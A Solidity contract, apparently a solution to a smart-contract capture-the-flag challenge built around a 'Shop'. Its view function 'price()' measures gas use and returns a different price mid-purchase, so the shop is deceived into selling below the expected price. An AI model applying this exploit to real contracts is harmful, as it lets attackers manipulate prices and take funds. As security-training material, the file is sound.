// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";
import "hardhat/console.sol";

contract ProxyBuyer is Buyer {
  uint gasAtBuy;

  function buy(address _shop) external {
    Shop shop = Shop(_shop);
    gasAtBuy = gasleft();
    shop.buy();
  }

  function price() external view override returns (uint) {
    uint gasUsed = gasAtBuy - gasleft();
    if(gasUsed == 925981) {
        return 101;
    } else {
        return 0;
    }
  }
}